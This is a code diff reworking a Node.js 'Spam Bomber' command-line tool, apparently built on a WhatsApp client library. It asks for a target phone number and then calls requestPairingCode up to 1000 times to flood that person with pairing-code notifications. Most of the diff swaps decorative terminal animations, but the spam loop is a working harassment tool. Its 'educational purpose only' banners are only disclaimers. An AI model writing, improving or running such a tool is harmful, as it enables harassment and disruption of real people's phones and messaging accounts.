@@ -5,180 +5,238 @@ const readline = require("readline");
 const colors = {
     red: '\x1b[31m', green: '\x1b[32m', yellow: '\x1b[33m', blue: '\x1b[34m',
     magenta: '\x1b[35m', cyan: '\x1b[36m', white: '\x1b[37m', gray: '\x1b[90m',
-    reset: '\x1b[0m', bright: '\x1b[1m', dim: '\x1b[2m'
+    reset: '\x1b[0m', bright: '\x1b[1m', dim: '\x1b[2m', blink: '\x1b[5m'
 };
 
-const rainbow = ['\x1b[31m', '\x1b[33m', '\x1b[32m', '\x1b[36m', '\x1b[34m', '\x1b[35m', '\x1b[91m', '\x1b[93m'];
+const rainbow = ['\x1b[31m', '\x1b[91m', '\x1b[33m', '\x1b[93m', '\x1b[32m', '\x1b[92m', '\x1b[36m', '\x1b[96m', '\x1b[34m', '\x1b[94m', '\x1b[35m', '\x1b[95m'];
 
-const frames = {
-    spinner: ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'],
-    dots: ['∙∙∙', '●∙∙', '∙●∙', '∙∙●', '∙∙∙'],
-    wave: ['▁', '▂', '▃', '▄', '▅', '▆', '▇', '█', '▇', '▆', '▅', '▄', '▃', '▂'],
-    square: ['◰', '◳', '◲', '◱'],
-    circle: ['◐', '◓', '◑', '◒'],
-    arrow: ['←', '↖', '↑', '↗', '→', '↘', '↓', '↙'],
-    bounce: ['⠁', '⠂', '⠄', '⡀', '⢀', '⠠', '⠐', '⠈']
-};
-
-class UltraAnimator {
+class AnimatorGila {
     constructor() { this.intervals = []; this.timeouts = []; }
     
-    clearAll() { this.intervals.forEach(clearInterval); this.timeouts.forEach(clearTimeout); this.intervals = []; this.timeouts = []; }
+    clearAll() { 
+        this.intervals.forEach(clearInterval); 
+        this.timeouts.forEach(clearTimeout); 
+        this.intervals = []; 
+        this.timeouts = []; 
+    }
     
-    rainbowText(text, speed = 100) {
+    taxiAnimation(speed = 100) {
         return new Promise((resolve) => {
-            let i = 0;
-            const frames = [];
-            for (let f = 0; f < rainbow.length; f++) {
-                let frame = '';
-                for (let c = 0; c < text.length; c++) {
-                    frame += rainbow[(f + c) % rainbow.length] + text[c];
-                }
-                frames.push(frame + colors.reset);
-            }
-            const animate = () => {
-                readline.cursorTo(process.stdout, 0);
-                process.stdout.write(frames[i % frames.length]);
-                i++;
-                if (i < 50) {
-                    this.timeouts.push(setTimeout(animate, speed));
-                } else {
-                    readline.cursorTo(process.stdout, 0);
-                    process.stdout.write(text + colors.reset);
-                    resolve();
-                }
-            };
-            animate();
-        });
-    }
-    
-    matrixRain(lines = 10, duration = 3000) {
-        const chars = '01';
-        const cols = process.stdout.columns || 80;
-        const drops = Array(cols).fill(0);
-        const startTime = Date.now();
-        
-        const interval = setInterval(() => {
-            process.stdout.write('\x1b[32m');
-            for (let i = 0; i < cols; i++) {
-                const char = chars[Math.floor(Math.random() * chars.length)];
-                process.stdout.write(char);
-                drops[i] = (drops[i] + 1) % lines;
-            }
-            if (Date.now() - startTime > duration) {
-                clearInterval(interval);
-                process.stdout.write('\x1b[0m\n');
-            }
-        }, 50);
-        this.intervals.push(interval);
-    }
-    
-    particleExplosion(text, duration = 2000) {
-        const particles = ['✦', '✧', '❖', '❀', '✣', '✤', '✥', '✺', '✻', '✼', '✽', '❃', '❋'];
-        const cols = process.stdout.columns || 80;
-        const rows = 10;
-        const grid = Array(rows).fill().map(() => Array(cols).fill(' '));
-        const centerX = Math.floor(cols / 2);
-        const centerY = Math.floor(rows / 2);
-        
-        text.split('').forEach((char, i) => {
-            const x = centerX - Math.floor(text.length / 2) + i;
-            if (x >= 0 && x < cols) grid[centerY][x] = char;
-        });
-        
-        const startTime = Date.now();
-        const interval = setInterval(() => {
-            console.clear();
-            const time = Date.now() - startTime;
-            const progress = Math.min(time / duration, 1);
+            const width = 60;
+            let pos = -20;
+            const taxi = [
+                '      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄',
+                '     █             █',
+                '    █  🚖 TAXI-SPAM  █',
+                '   █               █',
+                '   █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█',
+                '     ██         ██',
+                '    █  █       █  █',
+                '   █    █     █    █',
+                '  █      █▄▄▄▄█      █'
+            ];
             
-            for (let y = 0; y < rows; y++) {
-                let line = '';
-                for (let x = 0; x < cols; x++) {
-                    if (grid[y][x] !== ' ') {
-                        const colorIndex = Math.floor((x + y + time/100) % rainbow.length);
-                        line += rainbow[colorIndex] + grid[y][x] + colors.reset;
-                    } else if (Math.random() < 0.1 * progress) {
-                        const particle = particles[Math.floor(Math.random() * particles.length)];
-                        const colorIndex = Math.floor(Math.random() * rainbow.length);
-                        line += rainbow[colorIndex] + particle + colors.reset;
-                    } else {
-                        line += ' ';
-                    }
-                }
-                console.log(line);
-            }
-            
-            if (progress >= 1) {
-                clearInterval(interval);
+            const road = '══════════════════════════════════════════════════════════';
+            const interval = setInterval(() => {
                 console.clear();
-            }
-        }, 100);
-        this.intervals.push(interval);
-    }
-    
-    glitchText(text, iterations = 20) {
-        const glitchChars = '!@#$%^&*()_+-=[]{}|;:,.<>?/~`';
-        return new Promise((resolve) => {
-            let i = 0;
-            const animate = () => {
-                let glitched = '';
-                for (let j = 0; j < text.length; j++) {
-                    if (Math.random() < 0.3 && i < iterations - 5) {
-                        glitched += colors.red + glitchChars[Math.floor(Math.random() * glitchChars.length)] + colors.reset;
-                    } else {
-                        const color = rainbow[(j + i) % rainbow.length];
-                        glitched += color + text[j] + colors.reset;
+                console.log(colors.yellow + '\n' + road + colors.reset);
+                
+                for (let i = 0; i < taxi.length; i++) {
+                    let line = ' '.repeat(Math.max(0, pos)) + taxi[i];
+                    if (pos + taxi[i].length > width) {
+                        line = line.substring(0, width);
                     }
+                    console.log(colors.yellow + line + colors.reset);
                 }
-                readline.cursorTo(process.stdout, 0);
-                process.stdout.write(glitched);
-                i++;
-                if (i < iterations) {
-                    this.timeouts.push(setTimeout(animate, 80));
-                } else {
-                    readline.cursorTo(process.stdout, 0);
-                    process.stdout.write(text + colors.reset + '\n');
+                
+                console.log(colors.yellow + road + colors.reset);
+                console.log(colors.green + '\n' + ' '.repeat(pos + 5) + '🚀 MENGIRIM SPAM KE TARGET...' + colors.reset);
+                
+                pos += 2;
+                if (pos > width + 20) {
+                    clearInterval(interval);
+                    console.clear();
                     resolve();
                 }
-            };
-            animate();
+            }, speed);
+            this.intervals.push(interval);
         });
     }
     
-    loadingBar(total, text = '') {
-        return {
-            update: (current) => {
-                const width = 40;
-                const percent = current / total;
-                const filled = Math.round(width * percent);
-                const bar = colors.green + '█'.repeat(filled) + colors.gray + '░'.repeat(width - filled) + colors.reset;
-                const percentText = Math.round(percent * 100);
-                const spinner = frames.spinner[current % frames.spinner.length];
+    policeCar() {
+        return new Promise((resolve) => {
+            const width = 70;
+            let pos = -25;
+            const police = [
+                '      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄',
+                '     █ 🚓 POLICE-SPAM █',
+                '    █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█',
+                '     ██   🔴🔵   ██',
+                '    █  █         █  █',
+                '   █    █       █    █',
+                '  █      █▄▄▄▄▄█      █'
+            ];
+            
+            const interval = setInterval(() => {
+                console.clear();
+                console.log(colors.red + '\n══════════════════════════════════════════════════════════════' + colors.reset);
                 
-                readline.cursorTo(process.stdout, 0);
-                process.stdout.write(`${spinner} ${bar} ${percentText}% ${text}`);
-                
-                if (current >= total) {
-                    readline.cursorTo(process.stdout, 0);
-                    process.stdout.write(colors.green + '✓' + colors.reset + ' ' + colors.green + '█'.repeat(width) + colors.reset + ` 100% ${text}\n`);
+                for (let i = 0; i < police.length; i++) {
+                    let line = ' '.repeat(Math.max(0, pos)) + police[i];
+                    console.log(colors.blue + line + colors.reset);
                 }
-            }
-        };
+                
+                console.log(colors.red + '══════════════════════════════════════════════════════════════' + colors.reset);
+                console.log(colors.red + '\n' + ' '.repeat(pos + 5) + '🚨 WARNING: HANYA UNTUK EDUKASI!' + colors.reset);
+                
+                pos += 3;
+                if (pos > width + 25) {
+                    clearInterval(interval);
+                    console.clear();
+                    resolve();
+                }
+            }, 80);
+            this.intervals.push(interval);
+        });
     }
     
-    typewriter(text, delay = 30) {
+    bomberAnimation() {
+        return new Promise((resolve) => {
+            const bomber = [
+                '     ✈️',
+                '    /|\\',
+                '   / | \\',
+                '  /__|__\\',
+                '  💣💣💣',
+                '  \\     /',
+                '   \\   /',
+                '    \\ /',
+                '     V'
+            ];
+            
+            let y = 0;
+            const interval = setInterval(() => {
+                console.clear();
+                console.log(colors.red + '\n' + ' '.repeat(30) + '💥 BOMBER SPAM ACTIVATED 💥' + colors.reset);
+                console.log(colors.yellow + '══════════════════════════════════════════════════════' + colors.reset);
+                
+                for (let i = 0; i < bomber.length; i++) {
+                    console.log(' '.repeat(40) + bomber[i]);
+                }
+                
+                console.log(colors.yellow + '══════════════════════════════════════════════════════' + colors.reset);
+                
+                const bombs = '💣'.repeat(Math.floor(y / 2));
+                console.log(colors.red + '\n' + ' '.repeat(20) + bombs + colors.reset);
+                console.log(colors.green + ' '.repeat(25) + '🚀 MENUJU TARGET...' + colors.reset);
+                
+                y++;
+                if (y > 20) {
+                    clearInterval(interval);
+                    console.clear();
+                    for (let i = 0; i < 5; i++) {
+                        console.clear();
+                        console.log(colors.red + '\n' + '💥'.repeat(30));
+                        console.log(' '.repeat(15) + '💣 BOOM! SPAM TERKIRIM! 💣');
+                        console.log('💥'.repeat(30) + colors.reset);
+                        setTimeout(() => {}, 200);
+                    }
+                    console.clear();
+                    resolve();
+                }
+            }, 150);
+            this.intervals.push(interval);
+        });
+    }
+    
+    sateliteAnimation() {
+        return new Promise((resolve) => {
+            const sat = [
+                '    🔭',
+                '   /|\\',
+                '  / | \\',
+                ' /__|__\\',
+                '   / \\',
+                '  /   \\',
+                ' 📡   📡'
+            ];
+            
+            let angle = 0;
+            const interval = setInterval(() => {
+                console.clear();
+                console.log(colors.cyan + '\n' + ' '.repeat(25) + '🛰️  SATELITE SPAM SCAN 🛰️' + colors.reset);
+                console.log(colors.blue + '~'.repeat(60) + colors.reset);
+                
+                const spaces = 30 + Math.sin(angle) * 10;
+                for (let i = 0; i < sat.length; i++) {
+                    console.log(' '.repeat(spaces) + sat[i]);
+                }
+                
+                console.log(colors.blue + '~'.repeat(60) + colors.reset);
+                console.log(colors.green + '\n' + ' '.repeat(20) + '📡 MENCARI TARGET...'.padEnd(40, '.') + colors.reset);
+                console.log(colors.yellow + ' '.repeat(20) + '📶 SINYAL: ' + '█'.repeat(Math.floor(Math.abs(Math.sin(angle) * 10))) + colors.reset);
+                
+                angle += 0.5;
+                if (angle > Math.PI * 4) {
+                    clearInterval(interval);
+                    console.clear();
+                    resolve();
+                }
+            }, 120);
+            this.intervals.push(interval);
+        });
+    }
+    
+    sendNotification(title, message, type = 'info') {
+        const color = type === 'success' ? colors.green : 
+                     type === 'error' ? colors.red : 
+                     type === 'warning' ? colors.yellow : colors.cyan;
+        
+        const icon = type === 'success' ? '✅' : 
+                    type === 'error' ? '❌' : 
+                    type === 'warning' ? '⚠️' : 'ℹ️';
+        
+        const notif = [
+            '┌' + '─'.repeat(50) + '┐',
+            `│ ${icon} ${title.padEnd(47)} │`,
+            '├' + '─'.repeat(50) + '┤',
+            `│ ${message.padEnd(48)} │`,
+            '└' + '─'.repeat(50) + '┘'
+        ];
+        
+        console.log('\n' + color + notif.join('\n') + colors.reset + '\n');
+    }
+    
+    showStats(success, failed, total) {
+        const width = 50;
+        const successBar = Math.floor((success / total) * width);
+        const failedBar = Math.floor((failed / total) * width);
+        const remaining = width - successBar - failedBar;
+        
+        console.log(colors.cyan + '\n' + '📊 ' + 'STATISTIK REAL-TIME '.padEnd(47, '═') + colors.reset);
+        console.log(colors.green + `   SUCCESS: ${'█'.repeat(successBar)} ${success}/${total}` + colors.reset);
+        console.log(colors.red + `   FAILED:  ${'█'.repeat(failedBar)} ${failed}/${total}` + colors.reset);
+        if (remaining > 0) {
+            console.log(colors.gray + `   PENDING: ${'░'.repeat(remaining)} ${total - success - failed}/${total}` + colors.reset);
+        }
+        console.log(colors.yellow + `   PROGRESS: ${Math.round(((success + failed) / total) * 100)}%` + colors.reset);
+        console.log(colors.cyan + '══════════════════════════════════════════════════════' + colors.reset);
+    }
+    
+    typewriter(text, delay = 20) {
         return new Promise((resolve) => {
             let i = 0;
-            process.stdout.write(colors.cyan);
+            const colors = [colors.cyan, colors.green, colors.yellow, colors.magenta];
+            let colorIdx = 0;
             
             const type = () => {
                 if (i < text.length) {
-                    process.stdout.write(text.charAt(i));
+                    process.stdout.write(colors[colorIdx % colors.length] + text.charAt(i) + colors.reset);
                     i++;
+                    colorIdx++;
                     this.timeouts.push(setTimeout(type, delay));
                 } else {
-                    process.stdout.write(colors.reset);
+                    process.stdout.write('\n');
                     resolve();
                 }
             };
@@ -187,7 +245,7 @@ class UltraAnimator {
     }
 }
 
-const anim = new UltraAnimator();
+const anim = new AnimatorGila();
 
 const question = (text) => {
     const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
@@ -196,69 +254,61 @@ const question = (text) => {
     });
 };
 
-async function epicEntrance() {
+async function showWelcome() {
     console.clear();
     
-    await anim.matrixRain(15, 2000);
-    await new Promise(r => setTimeout(r, 500));
+    await anim.taxiAnimation(80);
+    await new Promise(r => setTimeout(r, 800));
+    
+    await anim.policeCar();
+    await new Promise(r => setTimeout(r, 800));
+    
+    await anim.bomberAnimation();
+    await new Promise(r => setTimeout(r, 800));
+    
+    await anim.sateliteAnimation();
+    
     console.clear();
+    console.log(colors.red + '\n' + '🔥'.repeat(65));
+    console.log('🔥'.repeat(65));
+    console.log(colors.yellow);
+    console.log('   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄');
+    console.log('  █                                                       █');
+    console.log('  █  ██████╗ ██████╗ ███╗   ███╗██████╗ ███████╗██████╗   █');
+    console.log('  █ ██╔════╝██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗  █');
+    console.log('  █ ██║     ██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝  █');
+    console.log('  █ ██║     ██║   ██║██║╚██╔╝██║██╔═══╝ ██╔══╝  ██╔══██╗  █');
+    console.log('  █ ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║     ███████╗██║  ██║  █');
+    console.log('  █  ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝  █');
+    console.log('  █                                                       █');
+    console.log('  █  ███████╗██████╗  █████╗ ███╗   ███╗                 █');
+    console.log('  █  ██╔════╝██╔══██╗██╔══██╗████╗ ████║                 █');
+    console.log('  █  ███████╗██████╔╝███████║██╔████╔██║                 █');
+    console.log('  █  ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║                 █');
+    console.log('  █  ███████║██║     ██║  ██║██║ ╚═╝ ██║                 █');
+    console.log('  █  ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝                 █');
+    console.log('  █                                                       █');
+    console.log('   ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀');
+    console.log(colors.reset);
+    console.log(colors.red + '🔥'.repeat(65));
+    console.log('🔥'.repeat(65) + colors.reset);
     
-    const title = "██████╗ ██████╗  █████╗ ██╗███████╗███╗   ██╗ ██████╗ ███████╗";
-    const title2 = "██╔══██╗██╔══██╗██╔══██╗██║██╔════╝████╗  ██║██╔════╝ ██╔════╝";
-    const title3 = "██████╔╝██████╔╝███████║██║█████╗  ██╔██╗ ██║██║  ███╗█████╗  ";
-    const title4 = "██╔═══╝ ██╔══██╗██╔══██║██║██╔══╝  ██║╚██╗██║██║   ██║██╔══╝  ";
-    const title5 = "██║     ██║  ██║██║  ██║██║███████╗██║ ╚████║╚██████╔╝███████╗";
-    const title6 = "╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝";
+    anim.sendNotification('WELCOME TO SPAM BOMBER', 'ULTIMATE PAIRING CODE SPAM TOOL v5.0', 'warning');
     
-    console.log('\n'.repeat(2));
-    await anim.glitchText(title, 25);
-    await anim.glitchText(title2, 25);
-    await anim.glitchText(title3, 25);
-    await anim.glitchText(title4, 25);
-    await anim.glitchText(title5, 25);
-    await anim.glitchText(title6, 25);
+    await anim.typewriter(colors.green + '\n   👑 CREATED BY: FLOWFALCON' + colors.reset);
+    await anim.typewriter(colors.cyan + '   🔥 RENOVASI BY: RIM' + colors.reset);
+    await anim.typewriter(colors.yellow + '   ⚠️  WARNING: FOR EDUCATIONAL PURPOSE ONLY!' + colors.reset);
     
-    console.log('\n');
-    await anim.particleExplosion("SPAM PAIRING CODE GENERATOR", 2500);
-    console.clear();
-    
-    const subtitle = "╔══════════════════════════════════════════════════════════════╗";
-    const subtitle2 = "║                    ULTIMATE SPAM TOOL v3.0                  ║";
-    const subtitle3 = "║              🔥 RENOVASI BY: RIM 🔥                       ║";
-    const subtitle4 = "║              👑 ORIGINAL BY: FLOWFALCON 👑                 ║";
-    const subtitle5 = "╚══════════════════════════════════════════════════════════════╝";
-    
-    console.log('\n'.repeat(3));
-    await anim.typewriter(subtitle, 10);
-    await anim.typewriter(subtitle2, 10);
-    await anim.typewriter(subtitle3, 10);
-    await anim.typewriter(subtitle4, 10);
-    await anim.typewriter(subtitle5, 10);
-    
-    console.log('\n');
-    await anim.rainbowText("=".repeat(65));
-    
-    const warning = "╔══════════════════════════════════════════════════════════════╗";
-    const warning2 = "║  ⚠️   HANYA UNTUK EDUKASI - JANGAN DISALAHGUNAKAN!   ⚠️     ║";
-    const warning3 = "╚══════════════════════════════════════════════════════════════╝";
-    
-    console.log('\n');
-    console.log(colors.red + warning + colors.reset);
-    console.log(colors.yellow + warning2 + colors.reset);
-    console.log(colors.red + warning3 + colors.reset);
-    
-    console.log('\n');
-    await anim.typewriter(colors.cyan + "🎯 " + colors.reset + colors.bright + "TEKAN ENTER UNTUK MEMULAI" + colors.reset, 40);
+    console.log('\n' + colors.magenta + '═'.repeat(65) + colors.reset);
+    await anim.typewriter(colors.white + '   🎯 TEKAN ENTER UNTUK MELANJUTKAN KE SPAM MODE...' + colors.reset);
     await question('');
     console.clear();
 }
 
 async function KleeProject() {
-    await epicEntrance();
+    await showWelcome();
     
-    console.log(colors.cyan + "\n" + "=".repeat(65) + colors.reset);
-    await anim.typewriter(colors.green + "📡 MEMUAT MODUL SPAM PAIRING..." + colors.reset, 20);
-    console.log(colors.cyan + "=".repeat(65) + colors.reset + "\n");
+    anim.sendNotification('SYSTEM INITIALIZATION', 'Loading spam modules and connecting to server...', 'info');
     
     try {
         const { state } = await useMultiFileAuthState('./69/session');
@@ -277,109 +327,136 @@ async function KleeProject() {
             browser: ["Ubuntu", "Chrome", "20.0.04"],
         });
         
-        await anim.typewriter(colors.magenta + "\n" + "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰" + colors.reset, 5);
-        console.log(colors.yellow + "\n🔥 MASUKKAN DETAIL TARGET 🔥" + colors.reset);
-        await anim.typewriter(colors.magenta + "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰" + colors.reset + "\n", 5);
+        anim.sendNotification('CONNECTION ESTABLISHED', 'Successfully connected to WhatsApp server!', 'success');
         
-        const phoneNumber = await question(colors.cyan + "📞 NOMOR TARGET (62xxxxxxxxxx): " + colors.reset);
-        if (!phoneNumber.startsWith('62')) {
-            console.log(colors.red + "\n❌ HARUS DIAWALI 62! CONTOH: 6281234567890" + colors.reset);
+        console.log(colors.yellow + '\n' + '🚨 '.repeat(16) + colors.reset);
+        const target = await question(colors.red + '\n💀 MASUKKAN NOMOR TARGET (62xxxxxxxxxx): ' + colors.reset);
+        
+        if (!target.startsWith('62')) {
+            anim.sendNotification('ERROR', 'Nomor harus diawali dengan 62! Contoh: 6281234567890', 'error');
             return;
         }
         
-        console.log('\n');
-        const KleeCodes = parseInt(await question(colors.cyan + "💣 JUMLAH SPAM (1-1000): " + colors.reset));
-        if (isNaN(KleeCodes) || KleeCodes <= 0 || KleeCodes > 1000) {
-            console.log(colors.red + "\n❌ MIN 1, MAX 1000!" + colors.reset);
+        const jumlah = parseInt(await question(colors.red + '💣 JUMLAH SPAM (1-1000): ' + colors.reset));
+        
+        if (isNaN(jumlah) || jumlah <= 0 || jumlah > 1000) {
+            anim.sendNotification('ERROR', 'Jumlah harus antara 1-1000!', 'error');
             return;
         }
         
+        anim.sendNotification('SPAM CONFIGURATION', `Target: ${target} | Amount: ${jumlah} codes`, 'warning');
+        
         console.clear();
-        await anim.particleExplosion(`MULAI SPAM KE: ${phoneNumber}`, 1500);
-        console.clear();
+        anim.sendNotification('ATTACK STARTED', `🚀 Launching spam attack to ${target}...`, 'info');
         
-        console.log(colors.green + "\n" + "█".repeat(65) + colors.reset);
-        console.log(colors.bright + colors.yellow + "                 🚀 SPAM DIMULAI! 🚀" + colors.reset);
-        console.log(colors.green + "█".repeat(65) + colors.reset);
+        let success = 0;
+        let failed = 0;
+        const kodeSukses = [];
         
-        const loading = anim.loadingBar(KleeCodes, colors.cyan + "Mengirim kode..." + colors.reset);
+        console.log(colors.red + '\n' + '💀 '.repeat(16) + colors.reset);
+        console.log(colors.yellow + '\n   🎯 TARGET: ' + colors.red + target + colors.reset);
+        console.log(colors.yellow + '   🔢 TOTAL: ' + colors.cyan + jumlah + ' kode pairing' + colors.reset);
+        console.log(colors.red + '💀 '.repeat(16) + colors.reset);
         
-        let sukses = 0;
-        let gagal = 0;
-        const codes = [];
+        const startTime = Date.now();
         
-        for (let i = 0; i < KleeCodes; i++) {
-            loading.update(i);
+        for (let i = 0; i < jumlah; i++) {
+            const attempt = i + 1;
             
             try {
-                let code = await KleeBotInc.requestPairingCode(phoneNumber);
+                anim.sendNotification(`ATTEMPT ${attempt}/${jumlah}`, `Sending pairing code to ${target}...`, 'info');
+                
+                let code = await KleeBotInc.requestPairingCode(target);
+                const originalCode = code;
                 code = code?.match(/.{1,4}/g)?.join("-") || code;
-                codes.push(code);
-                sukses++;
                 
-                console.log(colors.green + `\n✅ [${i+1}/${KleeCodes}] TERKIRIM → ${code}` + colors.reset);
-                console.log(colors.dim + `   📍 Target: ${phoneNumber} | Status: SUCCESS` + colors.reset);
+                success++;
+                kodeSukses.push({ code: code, original: originalCode });
                 
-                const emotes = ['✨', '🎯', '⚡', '💥', '🌟', '🔥', '🎪', '🌈', '💫', '🦄'];
-                const randomEmote = emotes[Math.floor(Math.random() * emotes.length)];
-                console.log(colors.magenta + `   ${randomEmote} Kode berhasil terkirim!` + colors.reset);
+                anim.sendNotification(`SUCCESS ${attempt}`, `Code sent: ${code}`, 'success');
+                console.log(colors.green + `   ✅ [${attempt}/${jumlah}] ${code} → TERKIRIM!` + colors.reset);
+                
+                if (success % 5 === 0) {
+                    anim.showStats(success, failed, jumlah);
+                }
                 
             } catch (error) {
-                gagal++;
-                console.log(colors.red + `\n❌ [${i+1}/${KleeCodes}] GAGAL → ${error.message}` + colors.reset);
-                console.log(colors.dim + `   📍 Target: ${phoneNumber} | Status: FAILED` + colors.reset);
+                failed++;
+                anim.sendNotification(`FAILED ${attempt}`, `Error: ${error.message}`, 'error');
+                console.log(colors.red + `   ❌ [${attempt}/${jumlah}] GAGAL: ${error.message}` + colors.reset);
             }
             
-            await new Promise(r => setTimeout(r, 800));
+            await new Promise(r => setTimeout(r, 700 + Math.random() * 300));
         }
         
-        loading.update(KleeCodes);
-        anim.clearAll();
+        const endTime = Date.now();
+        const duration = ((endTime - startTime) / 1000).toFixed(2);
         
         console.clear();
-        console.log(colors.cyan + "\n" + "╔" + "═".repeat(63) + "╗" + colors.reset);
-        console.log(colors.bright + colors.yellow + "                    📊 LAPORAN FINAL 📊" + colors.reset);
-        console.log(colors.cyan + "╚" + "═".repeat(63) + "╝" + colors.reset);
         
-        console.log(colors.green + `\n✅ SUCCESS: ${sukses} kode pairing` + colors.reset);
-        console.log(colors.red + `❌ FAILED: ${gagal} kode` + colors.reset);
-        console.log(colors.blue + `📈 TOTAL: ${KleeCodes} permintaan` + colors.reset);
+        anim.sendNotification('ATTACK COMPLETED', `Spam finished in ${duration} seconds!`, 'success');
         
-        const rate = ((sukses / KleeCodes) * 100).toFixed(1);
-        console.log(colors.magenta + `🎯 SUCCESS RATE: ${rate}%` + colors.reset);
+        console.log(colors.green + '\n' + '█'.repeat(65));
+        console.log('█'.repeat(65) + colors.reset);
         
-        if (codes.length > 0) {
-            console.log(colors.cyan + "\n📋 KODE YANG BERHASIL TERKIRIM:" + colors.reset);
-            codes.forEach((code, idx) => {
+        anim.sendNotification('FINAL REPORT', `Duration: ${duration}s | Target: ${target}`, 'info');
+        
+        console.log(colors.cyan + '\n   📊 DETAILED STATISTICS:' + colors.reset);
+        console.log(colors.green + `   ├─ ✅ SUCCESS: ${success} codes` + colors.reset);
+        console.log(colors.red + `   ├─ ❌ FAILED: ${failed} codes` + colors.reset);
+        console.log(colors.yellow + `   ├─ 🎯 TOTAL: ${jumlah} attempts` + colors.reset);
+        console.log(colors.magenta + `   ├─ ⚡ DURATION: ${duration} seconds` + colors.reset);
+        const rate = ((success / jumlah) * 100).toFixed(2);
+        console.log(colors.blue + `   └─ 📈 SUCCESS RATE: ${rate}%` + colors.reset);
+        
+        if (kodeSukses.length > 0) {
+            anim.sendNotification('SUCCESSFUL CODES', `${kodeSukses.length} codes delivered successfully!`, 'success');
+            
+            console.log(colors.yellow + '\n   📋 LIST OF DELIVERED CODES:' + colors.reset);
+            kodeSukses.forEach((item, idx) => {
                 const color = rainbow[idx % rainbow.length];
-                console.log(color + `   ${idx+1}. ${code}` + colors.reset);
+                console.log(color + `   ${(idx + 1).toString().padStart(3, '0')}. ${item.code}` + colors.reset);
             });
         }
         
-        console.log(colors.yellow + "\n" + "═".repeat(65) + colors.reset);
-        console.log(colors.green + "🎉 PROSES SPAM SELESAI!" + colors.reset);
-        console.log(colors.cyan + "🛠️  Renovasi oleh: RIM" + colors.reset);
-        console.log(colors.magenta + "👑 Original by: FlowFalcon" + colors.reset);
-        console.log(colors.yellow + "═".repeat(65) + colors.reset);
+        console.log(colors.green + '\n' + '█'.repeat(65));
+        console.log('█'.repeat(65) + colors.reset);
         
-        await anim.rainbowText("\n🔥 TERIMAKASIH TELAH MENGGUNAKAN TOOL INI! 🔥", 100);
+        anim.sendNotification('SYSTEM MESSAGE', 'Spam attack completed successfully!', 'success');
         
-        console.log('\n');
-        for (let i = 0; i < 10; i++) {
-            let fireworks = '';
-            for (let j = 0; j < 20; j++) {
-                fireworks += ['🎆', '🎇', '✨', '🌟', '💥', '⭐', '🌈', '💫'][Math.floor(Math.random() * 8)];
-            }
-            console.log(rainbow[i % rainbow.length] + fireworks + colors.reset);
-            await new Promise(r => setTimeout(r, 200));
+        console.log(colors.red + '\n' + '🔥 FINAL NOTIFICATION 🔥' + colors.reset);
+        console.log(colors.yellow + '   👑 Original Creator: FlowFalcon' + colors.reset);
+        console.log(colors.cyan + '   🔥 Renovation by: Rim' + colors.reset);
+        console.log(colors.magenta + '   ⚠️  Educational Purpose Only!' + colors.reset);
+        console.log(colors.green + '   ✅ All spam codes have been processed!' + colors.reset);
+        
+        console.log('\n' + colors.rainbow);
+        for (let i = 0; i < 3; i++) {
+            console.log('   🚀 '.repeat(8));
+            console.log('   💥 '.repeat(8));
+            await new Promise(r => setTimeout(r, 300));
         }
+        console.log(colors.reset);
+        
+        anim.sendNotification('THANK YOU', 'Thanks for using Spam Bomber Tool!', 'info');
         
     } catch (error) {
-        anim.clearAll();
-        console.log(colors.red + `\n💀 ERROR KRITIS: ${error.message}` + colors.reset);
-        console.log(colors.yellow + "🔧 Periksa koneksi internet dan session folder!" + colors.reset);
+        anim.sendNotification('CRITICAL ERROR', `System failed: ${error.message}`, 'error');
+        console.log(colors.red + '\n   💀 SYSTEM CRASHED!' + colors.reset);
+        console.log(colors.yellow + `   🔧 Error details: ${error.message}` + colors.reset);
+        console.log(colors.cyan + '   💡 Tips: Check internet connection and session folder' + colors.reset);
     }
+    
+    anim.clearAll();
 }
 
+process.on('SIGINT', () => {
+    anim.clearAll();
+    console.log(colors.red + '\n\n💀 SPAM STOPPED BY USER!' + colors.reset);
+    process.exit(0);
+});
+
 console.clear();
-setTimeout(() => KleeProject(), 500);
+KleeProject().catch(err => {
+    console.error(colors.red + 'FATAL ERROR: ' + err.message + colors.reset);
+});
